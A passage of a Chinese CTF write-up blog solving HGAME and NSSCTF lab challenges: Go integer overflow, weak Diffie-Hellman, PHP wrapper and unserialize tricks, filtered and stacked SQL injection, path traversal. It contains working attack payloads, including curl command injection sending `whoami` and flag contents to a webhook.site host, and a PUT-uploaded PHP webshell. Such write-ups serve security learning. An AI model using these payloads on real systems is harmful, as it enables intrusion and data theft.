class="hljs-number">318355</span>c4-be7a-<span class="hljs-number">4</span>a93-<span class="hljs-number">8241</span>-<span class="hljs-number">53</span>a6028f7070/`whoami`<br><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>|curl$IFS$<span class="hljs-number">9</span>https://webhook.site/<span class="hljs-number">318355</span>c4-be7a-<span class="hljs-number">4</span>a93-<span class="hljs-number">8241</span>-<span class="hljs-number">53</span>a6028f7070/`head$IFS$<span class="hljs-number">9</span>/f*`<br></code></pre></td></tr></table></figure><img src="/2023/01/05/HGAME/19.png" class=""><h3 id="gopher-shop"><a class="markdownIt-Anchor" href="#gopher-shop"></a> Gopher Shop</h3><p>这道是没有做出来的题，看了wp，学习一下</p><p>随便注册一个账户进去商店</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//校验是否买的起</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> || number &lt; <span class="hljs-number">1</span> || user.Balance &lt; <span class="hljs-type">uint</span>(number) * price&#123;<br>context.JSON(<span class="hljs-number">400</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;invalid request&quot;</span>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这里是golang整数溢出漏洞，uint类型在64位机器上运⾏时为uint64，最⼤值为 18446744073709551615 ,最⼩值为 0 ，超出范围都会溢出。</p><p>要使<code>uint(number) * price</code>小于等于给定的10元，这样就可以买到超多的Apple,再把Apple买出去就可以用来买flag</p><p><code>1844674407370955162*10=18446744073709551620=4&lt;10</code>,因此可以购买1844674407370955162个Apple</p><img src="/2023/01/05/HGAME/20.png" class=""><p>慢慢地把Apple卖出去（数值不能溢出）</p><img src="/2023/01/05/HGAME/21.png" class=""><p>再Check Flag一下，<code>hgame&#123;GopherShop_M@gic_1nt_0verflow&#125;</code></p><h3 id="ezdh"><a class="markdownIt-Anchor" href="#ezdh"></a> ezDH</h3><p>这个密码题不知道可以用sage⾥的discrete_log函数来解离散对数问题</p><p>discrete_log 就是结合Pohlig-Hellman algorithm和⼤步⼩步法 (bsgs)</p><p>可以对数分离就变得简单了</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage <span class="hljs-keyword">import</span> *<br>N = <span class="hljs-number">0x2be227c3c0e997310bc6dad4ccfeec793dca4359aef966217a88a27da31ffbcd6bb271780d8ba89e3cf202904efde03c59fef3e362b12e5af5afe8431cde31888211d72cc1a00f7c92cb6adb17ca909c3b84fcad66ac3be724fbcbe13d83bbd3ad50c41a79fcdf04c251be61c0749ea497e65e408dac4bbcb3148db4ad9ca0aa4ee032f2a4d6e6482093aa7133e5b1800001</span><br>g = GF(N)(<span class="hljs-number">2</span>)<br>A = <span class="hljs-number">0x22888b5ac1e2f490c55d0891f39aab63f74ea689aa3da3e8fd32c1cd774f7ca79538833e9348aebfc8eba16e850bbb94c35641c2e7e7e8cb76032ad068a83742dbc0a1ad3f3bef19f8ae6553f39d8771d43e5f2fcb986bd72459456d073e70d5be4d79ce5f10f76edea01492f11b807ebff0faf6819d62a8e972084e1ed5dd6e0152df2b0477a42246bbaa04389abf639833</span><br>B = <span class="hljs-number">0x1889c9c65147470fdb3ad3cf305dc3461d1553ee2ce645586cf018624fc7d8e566e04d416e684c0c379d5819734fd4a09d80add1b3310d76f42fcb1e2f5aac6bcdd285589b3c2620342deffb73464209130adbd3a444b253fc648b40f0acec7493adcb3be3ee3d71a00a2b121c65b06769aada82cd1432a6270e84f7350cd61dddc17fe14de54ab436f41b9c9a0430510dde</span><br>a=discrete_log(A,g)<br>b=discrete_log(B,g)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Alice secret:&#x27;</span>,a)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bod secret:&#x27;</span>,b)<br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">pow</span>(B,a,N)==<span class="hljs-built_in">pow</span>(A,b,N)<br>shared_secret=power_mod(B,a,N)<br>p=<span class="hljs-number">6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057151</span><br>a=-<span class="hljs-number">3</span><br>b=<span class="hljs-number">1093849038073734274511112390766805569936207598951683748994586394495953116150735016013708737573759623248592132296706313309438452531591012912142327488478985984</span><br>E = EllipticCurve(GF(p), [a, b])<br><br>G=(<span class="hljs-number">6205877918333770287323403670543661734129170085954198767820861962261174202646976379181735257759867760655835711845144326470613882395445975482219869828210975915</span>, <span class="hljs-number">3475351956909044812130266914587199895248867449669290021764126870271692995160201860564302206748373950979891071705183465400186006709376501382325624851012261206</span>)<br>G=E(G)<br>Pa=(<span class="hljs-number">2131916734759224323822132103713450942372127857975491448998753734796387810139407713081623540463771547844600806401723562334185214530516095152824413924854874698</span>, <span class="hljs-number">1690322613136671350646569297044951327454506934124656653046321341087958059722809120500999091493097880695888777563486212179798037350151439310538948719271467773</span>) <br>Pa=E(Pa)<br>P1=(<span class="hljs-number">2032638959575737798553734238953177065671021112450002471824225734491735604600003028491729131445734432442510201955977472408728415227018746467250107080483073647</span>, <span class="hljs-number">3510147080793750133751646930018687527128938175786714269902604502700248948154299853980250781583789623838631244520649113071664767897964611902120411142027848868</span>)<br>P1=E(P1)<br>c=(<span class="hljs-number">6670373437344180404127983821482178149374116817544688094986412631575854021385459676854475335068369698875988135009698187255523501841013430892133371577987480522</span>, <span class="hljs-number">6648964426034677304189862902917458328845484047818707598329079806732346274848955747700716101983207165347315916182076928764076602008846695049181874187707051395</span>)<br>c=E(c)<br>m=c-shared_secret*P1<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(m.xy()[<span class="hljs-number">0</span>]))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>m=<span class="hljs-number">13292147408567104965230968399931206813163211945388416847625302108610603758415964822638521981</span><br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br><span class="hljs-comment">#hgame&#123;Weak_p@ramet3r_make_DHKE_broken&#125;</span><br></code></pre></td></tr></table></figure><h3 id="tunnel"><a class="markdownIt-Anchor" href="#tunnel"></a> Tunnel</h3><p>用wireshark打开，搜索hagme就拿到flag<code>hgame&#123;ikev1_may_not_safe_aw987rtgh&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSSCTFwp</title>
    <link href="/2023/01/04/NSSCTFwp/"/>
    <url>/2023/01/04/NSSCTFwp/</url>
    
    <content type="html"><![CDATA[<h3 id="swpuctf-2021-新生赛pseudoprotocols"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛pseudoprotocols"></a> [SWPUCTF 2021 新生赛]PseudoProtocols</h3><p>有关PHP伪协议简单记一下</p><p>上来给了一个提示</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">hint</span> <span class="hljs-keyword">is</span> hear Can you find out the <span class="hljs-keyword">hint</span>.php?<br></code></pre></td></tr></table></figure><p>再看地址栏有参数wllm</p><p>直接想到伪协议读文件</p><p><code>php://filter/read=convert.base64-encode/resource=hint.php</code></p><p>base64解码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//go to /test2222222222222.php</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>访问/test2222222222222.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;max_execution_time&quot;</span>, <span class="hljs-string">&quot;180&quot;</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$a</span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;r&#x27;</span>)) === <span class="hljs-string">&#x27;I want flag&#x27;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success\n&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>代码审计，直接php://input  再post 一个I want flag 搞定</p><img src="/2023/01/04/NSSCTFwp/1.png" class=""><h3 id="hubuctf-2022-新生赛checkin"><a class="markdownIt-Anchor" href="#hubuctf-2022-新生赛checkin"></a> [HUBUCTF 2022 新生赛]checkin</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$username</span>  = <span class="hljs-string">&quot;this_is_secret&quot;</span>; <br><span class="hljs-variable">$password</span>  = <span class="hljs-string">&quot;this_is_not_known_to_you&quot;</span>; <br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<span class="hljs-comment">//here I changed those two </span><br><span class="hljs-variable">$info</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;info&#x27;</span>])? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;info&#x27;</span>]: <span class="hljs-string">&quot;&quot;</span> ;<br><span class="hljs-variable">$data_unserialize</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$info</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$data_unserialize</span>[<span class="hljs-string">&#x27;username&#x27;</span>]==<span class="hljs-variable">$username</span>&amp;&amp;<span class="hljs-variable">$data_unserialize</span>[<span class="hljs-string">&#x27;password&#x27;</span>]==<span class="hljs-variable">$password</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;username or password error!&quot;</span>;<br><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>username和password都会被修改成不知道的值，所以不可能给他们赋上真实的值</p><p>这里用<code>==</code>是弱比较</p><p>并且用了反序列化</p><p>因此，构造info如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$info</span>=<span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;username&#x27;</span>=&gt;<span class="hljs-literal">true</span>,<br>    <span class="hljs-string">&#x27;password&#x27;</span>=&gt;<span class="hljs-literal">true</span><br>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$info</span>));<br><span class="hljs-comment">#a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>因为上面用的是键名访问，所以这里要用数组</p><p>简单介绍弱类型比较</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin&quot;</span>==<span class="hljs-number">0</span>);  <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;1admin&quot;</span>==<span class="hljs-number">1</span>); <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin1&quot;</span>==<span class="hljs-number">1</span>) <span class="hljs-comment">//false</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin1&quot;</span>==<span class="hljs-number">0</span>) <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;a&quot;</span>==<span class="hljs-literal">true</span>)  <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;a&quot;</span>==<span class="hljs-literal">false</span>)  <span class="hljs-comment">//false</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;0e123456&quot;</span>==<span class="hljs-string">&quot;0e4456789&quot;</span>); <span class="hljs-comment">//true </span><br><span class="hljs-meta">?&gt;</span>  <br><br></code></pre></td></tr></table></figure><p><code>NSSCTF&#123;881620fb-c01a-4eda-bbfa-baef4a333f9e&#125;</code></p><h3 id="swpuctf-2021-新生赛sql"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛sql"></a> [SWPUCTF 2021 新生赛]sql</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mysql">过滤注释符，用%23替代<br>过滤空格，用/**/替代<br>?wllm=1&#x27;/**/order/**/by/**/3%23   #3列<br>?wllm=0&#x27;/**/union/**/select/**/1,2,database()%23   #test_db<br>过滤等号,用like替代<br>?wllm=0&#x27;/**/union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()%23 #LTLT_flag,users<br>?wllm=0&#x27;/**/union/**/select/**/1,2,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/&#x27;LTLT_flag&#x27;%23  #id,flag<br>?wllm=0&#x27;/**/union/**/select/**/1,2,group_concat(flag)/**/from/**/LTLT_flag%23   #NSSCTF&#123;b0c390d7-ca62<br>group_concat只回显20个字符，使用right,REVERSE,substr被过滤，使用mid替代<br>?wllm=0&#x27;/**/union/**/select/**/1,2,mid(group_concat(flag),21,20)/**/from/**/LTLT_flag%23 #-4071-9468-bb0808163<br>?wllm=0&#x27;/**/union/**/select/**/1,2,mid(group_concat(flag),41,20)/**/from/**/LTLT_flag%23  #493&#125;<br></code></pre></td></tr></table></figure><p><code>NSSCTF&#123;b0c390d7-ca62-4071-9468-bb0808163493&#125;</code></p><h3 id="强网杯-2019随便注"><a class="markdownIt-Anchor" href="#强网杯-2019随便注"></a> [强网杯 2019]随便注</h3><p>这道是mysql堆叠注入</p><p>payload如下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;;show tables;&#x27;得到两个表：<span class="hljs-number">1919810931114514</span> words<br><span class="hljs-attribute">1</span>&#x27;;show columns from `<span class="hljs-number">1919810931114514</span>`;&#x27;得到字段名为flag<br><span class="hljs-attribute">1</span>&#x27;;handler `<span class="hljs-number">1919810931114514</span>` open;handler `<span class="hljs-number">1919810931114514</span>` read first;&#x27;读出flag:NSSCTF&#123;<span class="hljs-number">2</span>cc5ca69-<span class="hljs-number">9</span>cec-<span class="hljs-number">4</span>a31-<span class="hljs-number">8</span>cb4-ee8748c8b51f&#125;<br></code></pre></td></tr></table></figure><h3 id="nssround1-basicbasic_check"><a class="markdownIt-Anchor" href="#nssround1-basicbasic_check"></a> [NSSRound#1 Basic]basic_check</h3><p>看到时有关HTTP，查看请求头都没看到什么，扫描也没有什么提示</p><p>用curl命令扫一下</p><img src="/2023/01/04/NSSCTFwp/5.jpg" class=""><p>现有请求方法可以用PUT，直接写入木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><img src="/2023/01/04/NSSCTFwp/6.png" class=""><p>访问1.php，传参</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">ls</span> /</span><br>?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">cat</span> /flag</span><br><span class="hljs-comment">#NSSCTF&#123;01dfc03a-f0f6-419d-a992-32dd79ea301d&#125;</span><br></code></pre></td></tr></table></figure><h3 id="nisactf-2022babyupload"><a class="markdownIt-Anchor" href="#nisactf-2022babyupload"></a> [NISACTF 2022]babyupload</h3><p>看到文件上传</p><p>先看一下页面源码，是否有什么提示</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/upload&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    Select image to upload:<br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Upload File&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-comment">&lt;!-- /source --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>不错，访问 /source下载到一个python文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, redirect, g, send_from_directory<br><span class="hljs-keyword">import</span> sqlite3<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> uuid<br><br>app = Flask(__name__)<br><br>SCHEMA = <span class="hljs-string">&quot;&quot;&quot;CREATE TABLE files (</span><br><span class="hljs-string">id text primary key,</span><br><span class="hljs-string">path text</span><br><span class="hljs-string">);</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>    g_db = <span class="hljs-built_in">getattr</span>(g, <span class="hljs-string">&#x27;_database&#x27;</span>, <span class="hljs-literal">None</span>)<br>    <span class="hljs-keyword">if</span> g_db <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        g_db = g._database = sqlite3.connect(<span class="hljs-string">&quot;database.db&quot;</span>)<br>    <span class="hljs-keyword">return</span> g_db<br><br><br><span class="hljs-meta">@app.before_first_request</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setup</span>():<br>    os.remove(<span class="hljs-string">&quot;database.db&quot;</span>)<br>    cur = db().cursor()<br>    cur.executescript(SCHEMA)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello_world</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span><br><span class="hljs-string">&lt;html&gt;</span><br><span class="hljs-string">&lt;body&gt;</span><br><span class="hljs-string">&lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="hljs-string">    Select image to upload:</span><br><span class="hljs-string">    &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; name=&quot;submit&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;!-- /source --&gt;</span><br><span class="hljs-string">&lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;&quot;&quot;&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/source&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">source</span>():<br>    <span class="hljs-keyword">return</span> send_from_directory(directory=<span class="hljs-string">&quot;/var/www/html/&quot;</span>, path=<span class="hljs-string">&quot;www.zip&quot;</span>, as_attachment=<span class="hljs-literal">True</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br>    file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;.&quot;</span> <span class="hljs-keyword">in</span> file.filename:<span class="hljs-comment">#文件名不能有点，也就是不能有后缀</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Bad filename!&quot;</span>, <span class="hljs-number">403</span><br>    conn = db()<br>    cur = conn.cursor()<br>    uid = uuid.uuid4().<span class="hljs-built_in">hex</span>  <span class="hljs-comment">#生成一个UID号</span><br>    <span class="hljs-keyword">try</span>:<span class="hljs-comment">#将uid号和文件名放入数据库</span><br>        cur.execute(<span class="hljs-string">&quot;insert into files (id, path) values (?, ?)&quot;</span>, (uid, file.filename,))<br>    <span class="hljs-keyword">except</span> sqlite3.IntegrityError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Duplicate file&quot;</span><br>    conn.commit()<br><br>    file.save(<span class="hljs-string">&#x27;uploads/&#x27;</span> + file.filename)    <span class="hljs-comment">#文件保存路径</span><br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/file/&#x27;</span> + uid)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/file/&lt;id&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">file</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    conn = db()<br>    cur = conn.cursor()<br>    cur.execute(<span class="hljs-string">&quot;select path from files where id=?&quot;</span>, (<span class="hljs-built_in">id</span>,))<br><span class="hljs-comment">#通过uid号对应的文件名来作为路径访问</span><br>    res = cur.fetchone()  <span class="hljs-comment">#放回文件路径</span><br>    <span class="hljs-keyword">if</span> res <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;File not found&quot;</span>, <span class="hljs-number">404</span>    <br><br>    <span class="hljs-comment"># print(res[0])</span><br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(os.path.join(<span class="hljs-string">&quot;uploads/&quot;</span>, res[<span class="hljs-number">0</span>]), <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<span class="hljs-comment">#读取文件</span><br>        <span class="hljs-keyword">return</span> f.read()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br><br></code></pre></td></tr></table></figure><p>审计一下</p><p>上传的文件文件没有后缀，必定不会解析，看到后面也发现是利用文件名来实现文件读取</p><p>整体逻辑：上传一个文件，获取一个文件的UID号，将UID号和作为字段名，文件名作为字段值存储到数据库中，文件保存路径为<code>'uploads/' + file.filename</code>,通过UID号访问获得文件名，从而访问<code>'uploads/' + file.filename</code>.</p><p>所以这里的文件名可以使用系统中已有的文件路径，从而导致文件读取</p><img src="/2023/01/04/NSSCTFwp/7.png" class=""><p>直接访问/file/uid就可以得到flag<code>NSSCTF&#123;b56d535f-18b5-4446-9014-e33ad2496b8e&#125;</code></p><h3 